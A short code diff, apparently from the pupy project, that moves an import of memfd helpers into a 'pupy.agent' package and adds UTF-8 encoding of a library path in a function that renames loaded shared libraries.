@@ -13,7 +13,7 @@ import ctypes
 
 from io import open
 
-from pupy._linux_memfd import (
+from pupy.agent._linux_memfd import (
     memfd_is_supported, memfd_create
 )
 
@@ -83,7 +83,7 @@ def _change_dlname(lib, new_name):
     if dlinfo(lib._handle, RTLD_DI_LINKMAP, ctypes.byref(lm)) != 0:
         raise ValueError('dlinfo({}) failed'.format(lib._handle))
 
-    load_path = lib._name
+    load_path = lib._name.encode('utf8')
     lib_name = os.path.basename(load_path)
 
     if lm.contents.l_ns != 0:
